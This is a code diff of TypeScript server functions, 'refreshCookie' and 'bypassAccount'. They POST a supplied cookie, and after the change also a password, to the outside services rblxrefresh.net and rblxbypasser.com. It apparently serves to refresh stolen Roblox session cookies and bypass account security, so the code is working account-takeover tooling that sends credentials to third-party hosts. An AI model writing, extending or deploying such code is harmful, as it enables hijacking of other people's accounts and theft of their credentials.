@@ -1,10 +1,9 @@
 import { createServerFn } from "@tanstack/react-start";
 
 export const refreshCookie = createServerFn({ method: "POST" })
-  .inputValidator((d: { cookie: string; version: "v1" | "v2" }) => d)
+  .inputValidator((d: { cookie: string }) => d)
   .handler(async ({ data }) => {
-    const path = data.version === "v2" ? "/refreshv2" : "/refreshv1";
-    const res = await fetch(`https://www.rblxrefresh.net${path}`, {
+    const res = await fetch("https://www.rblxrefresh.net/refreshv1", {
       method: "POST",
       headers: {
         "Content-Type": "application/x-www-form-urlencoded",
@@ -19,7 +18,7 @@ export const refreshCookie = createServerFn({ method: "POST" })
   });
 
 export const bypassAccount = createServerFn({ method: "POST" })
-  .inputValidator((d: { cookie: string; version: "V1" | "V2" }) => d)
+  .inputValidator((d: { cookie: string; password: string }) => d)
   .handler(async ({ data }) => {
     const res = await fetch("https://rblxbypasser.com/api/bypass", {
       method: "POST",
@@ -32,12 +31,12 @@ export const bypassAccount = createServerFn({ method: "POST" })
       body: JSON.stringify({
         cookie: data.cookie,
         directoryPath: "",
-        version: data.version.toLowerCase(),
-        password: null,
+        version: "v2",
+        password: data.password,
       }),
     });
-    let json: any = null;
     const txt = await res.text();
+    let json: any;
     try {
       json = JSON.parse(txt);
     } catch {
